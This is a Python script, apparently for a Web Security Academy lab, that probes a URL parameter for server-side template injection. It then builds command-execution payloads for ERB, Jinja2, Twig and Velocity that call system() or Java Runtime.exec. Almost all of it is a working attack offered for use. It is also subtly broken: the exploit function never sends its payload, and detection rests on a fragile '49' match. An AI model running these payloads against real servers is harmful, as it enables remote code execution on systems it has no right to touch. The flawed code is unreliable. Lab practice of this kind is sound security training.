import requests
from urllib.parse import quote

# List of common SSTI payloads for different template engines
payloads = {
    "erb": ["<%= 7*7 %>", "<%= system('ls') %>"],
    "jinja2": ["{{ 7*7 }}", "{{ ''.__class__.__mro__[1].__subclasses__()[59]('ls').read() }}"],
    "twig": ["{{ 7*7 }}", "{{ system('ls') }}"],
    "velocity": ["#set($x = 7 * 7)", "$x", "#set($x = 7 * 7) $x", "#set($cmd = 'ls')", "#foreach($i in [1])", "$i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd)", "#end"]
}

# Function to check SSTI vulnerability
def check_ssti(url, param):
    for engine, tests in payloads.items():
        for payload in tests:
            encoded_payload = quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"

            try:
                response = requests.get(test_url)
                if response.status_code == 200 and "49" in response.text:
                    print(f"[+] SSTI vulnerability detected with {engine} payload: {payload}")
                    return True, engine
                else:
                    print(f"[-] SSTI vulnerability not detected with {engine} payload: {payload}")
            except requests.RequestException as e:
                print(f"[-] An error occurred: {e}")
    
    return False, None

# Function to exploit SSTI vulnerability
def exploit_ssti(url, param, engine, command):
    if engine not in payloads:
        print("[-] Unsupported template engine.")
        return
    
    # Select appropriate payload for command execution
    if engine == "erb":
        exploit_payload = f"<%= system('{command}') %>"
    elif engine == "jinja2":
        exploit_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[59]('{command}').read() }}}}"
    elif engine == "twig":
        exploit_payload = f"{{{{ system('{command}') }}}}"
    elif engine == "velocity":
        exploit_payload = f"#set($cmd = '{command}') #foreach($i in [1]) $i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd) #end"
    else:
        print("[-] Unsupported template engine.")
        return

if __name__ == "__main__":
    target_url = "https://0a9b00f003adc81281231bf40098000f.web-security-academy.net/"
    param = "message"

    ssti_detected, engine = check_ssti(target_url, param)
    if ssti_detected:
        # Replace 'ls /home/carlos' with the command you want to execute
        exploit_ssti(target_url, param, engine, "ls /home/carlos")
